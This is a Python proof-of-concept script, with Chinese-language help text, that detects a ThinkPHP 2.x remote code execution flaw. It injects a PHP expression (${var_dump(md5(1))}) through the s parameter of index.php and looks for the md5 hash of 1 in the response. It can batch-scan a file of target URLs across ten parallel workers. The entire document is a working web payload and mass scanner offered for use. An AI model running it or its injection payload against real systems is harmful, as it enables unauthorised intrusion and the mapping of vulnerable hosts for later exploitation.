def poc(target):
    result = {
        'name': 'Thinkphp 2.x rce',
        'vulnerable': False
    }
    try:
        payload = urllib.parse.urljoin(target, '/index.php?s=a/b/c/${var_dump(md5(1))}')
        response = requests.get(payload, timeout=3)
        if re.search(r'c4ca4238a0b923820dcc509a6f75849b', response.text):
            result['vulnerable'] = True
            result['method'] = 'GET'
            result['url'] = target
            result['payload'] = payload
            print(response)
    except:
        print(f"{target}访问失败")


def main():
    parser = argparse.ArgumentParser("ThinkPHP 2.x版本 代码执行漏洞检测POC")
    parser.add_argument("-u", "--url", dest="url", help="Insert URL")
    parser.add_argument("-f", "--file", dest="file", help="Insert URLs file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file, 'r') as uf:
            urls = []
            for u in uf.readlines():
                urls.append(u.strip())
            mp = Pool(10)
            mp.map(poc, urls)
            mp.close()
            mp.join()
    else:
        print("输入有误，请检查")

